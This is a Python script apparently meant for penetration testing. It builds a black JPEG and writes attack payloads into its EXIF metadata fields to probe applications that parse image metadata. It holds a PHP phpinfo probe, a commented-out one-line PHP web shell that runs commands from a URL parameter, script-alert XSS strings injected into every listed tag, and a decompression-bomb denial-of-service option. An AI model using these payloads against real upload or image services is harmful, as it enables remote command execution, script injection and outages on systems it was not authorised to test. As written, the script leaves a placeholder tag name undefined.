from io import BytesIO
from PIL import Image, TiffImagePlugin, TiffTags
from PIL.ExifTags import TAGS
from PIL.TiffImagePlugin import ImageFileDirectory_v2
import string
import random
import argparse

'''
This script creates black image in which you can enter your own arbitary EXIF data

USAGE:
1. Enter wanted payload to "payload"
2. If you want to edit only one EXIF field:
	a. Comment out Single start and Single end
	b. Enter your wanted EXIF tag key
2. If you want to edit all of the fields from the "exifs" array:
	a. Comment out Multi start and Multi end
3. Run this script
4. Run "get_EXIF_tags.py" to verify that you have the EXIF fields filled.

NOTES:
- Added random letters end of the payload to help identify the correct field from the logs in case of app crash
- Added decompression bomb DOS attack payload possibility
'''

# List of exif tag keys 
exifs = [36864, 40961, 37378, 37379, 41985, 36868, 36867, 513, 41992, 37385, 37386, 41995, 41483, 40965, 41486, 41487, 41488, 2, 41484, 41994, 512, 41493, 529, 530, 531, 532, 41492, 514, 41495, 37396, 1, 42016, 34850, 34852, 34855, 34856, 37500, 4096, 4097, 37510, 4098, 33421, 33423, 37520, 37521, 37522, 37377, 33432, 33434, 40091, 40092, 33437, 40093, 40094, 40095, 37380, 50341, 37381, 37382, 37383, 37384, 41728, 37121, 258, 41730, 37122, 259, 41729, 42240, 262, 40960, 266, 256, 40962, 269, 270, 257, 271, 272, 274, 40963, 40964, 277, 278, 279, 282, 283, 284, 296, 41986, 301, 41987, 305, 306, 41988, 41989, 315, 318, 319, 41990, 41991, 41993, 342, 41996, 34665, 34675, 33723]
# 273 not working

# Enter your payload here
#payload = "<?php phpinfo(); ?>"
#payload = "<?=@`$_GET[c]`;"
payload = '<?php phpinfo(); ?>'
scr = "<script>alert("
ipt = ")</script>"

_TAGS_r = dict(((v, k) for k, v in TAGS.items()))

# Create empty image 1000 x 1000
jpgimg1 = Image.new("RGB", (1000, 1000))
# For decompression bomb DOS attack use max supported image dimension 65535 x 65535
#jpgimg1 = Image.new("RGB", (65535, 65535))

# Image File Directory
ifd = ImageFileDirectory_v2()

########### Single start ############

# Enter EXIF tag key you want to edit here
ifd.tagtype[ENTER_YOUR_EXIF_TAG] = TiffTags.ASCII
ifd[ENTER_YOUR_EXIF_TAG] = payload

out = BytesIO()
ifd.save(out)

## Add magic number of exif structure
exif = b"Exif\x00\x00" + out.getvalue()
jpgimg1.save("out.jpg", exif=exif)
jpgimg2 = Image.open("out.jpg")
print(jpgimg2._getexif())

################ Single end #############



################## Multi start ###############
'''
letters = string.ascii_lowercase
for var in exifs:
	try:		
		ifd.tagtype[var] = TiffTags.ASCII
		ifd[var] = payload + ''.join(random.choice(letters) for i in range(5))
		#print(TiffTags.lookup(var))
		out = BytesIO()
		ifd.save(out)

		## Add magic number of exif structure
		exif = b"Exif\x00\x00" + out.getvalue()

		jpgimg1.save("out.jpg", exif=exif)
		jpgimg2 = Image.open("out.jpg")
		print(jpgimg2._getexif())
	except KeyError:
		print("This number didn't work: " + str(var))
'''
################ Multi ends ##############

################## Script in every tag start ###############
'''
letters = string.ascii_lowercase
for var in exifs:
	try:		
		ifd.tagtype[var] = TiffTags.ASCII
		ifd[var] = scr + ''.join(random.choice(letters) for i in range(5)) + ipt
		#print(TiffTags.lookup(var))
		out = BytesIO()
		ifd.save(out)

		## Add magic number of exif structure
		exif = b"Exif\x00\x00" + out.getvalue()

		jpgimg1.save("out.jpg", exif=exif)
		jpgimg2 = Image.open("out.jpg")
		print(var)
	except KeyError:
		print("This number didn't work: " + str(var))
print(jpgimg2._getexif())
'''
################## Script in every tag ends ###############